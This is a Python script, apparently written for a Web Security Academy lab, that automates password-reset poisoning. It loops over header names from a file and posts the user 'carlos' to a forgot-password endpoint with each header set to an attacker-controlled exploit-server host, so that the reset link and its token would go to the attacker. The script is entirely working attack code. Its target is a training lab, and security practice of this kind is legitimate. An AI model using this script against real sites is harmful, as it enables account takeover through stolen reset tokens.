import requests

# Set victim (site to be tested) & attacker (your webserver to receive requests)
victim = 'https://0a5600a7032c3bc782a12aba00e90055.web-security-academy.net/forgot-password'
attacker = "exploit-0a8a001003ff3b2a8214290b01dd001b.exploit-server.net"

# In case the request uses any parameters, define here
parameters = {'username': "carlos"}

# Send requests to victim
try:
    with open('custom_headers.txt', 'r') as file:
        for line in file:
            header = line.strip()
            custom_headers = {header: attacker}
            response = requests.post(victim, headers=custom_headers, data=parameters)

            print(f"URL: {victim}")
            print(f"Custom Header: {header}")
            print(f"Request Headers: {custom_headers}")
            print(f"Request parameters: {parameters}")
            print(f"Response Status Code: {response.status_code}")
            print(f"Response Content:\n{response.text}\n") 

except FileNotFoundError:
    print("The custom_headers.txt file was not found.")

except Exception as e:
    print(f"An error occurred: {e}")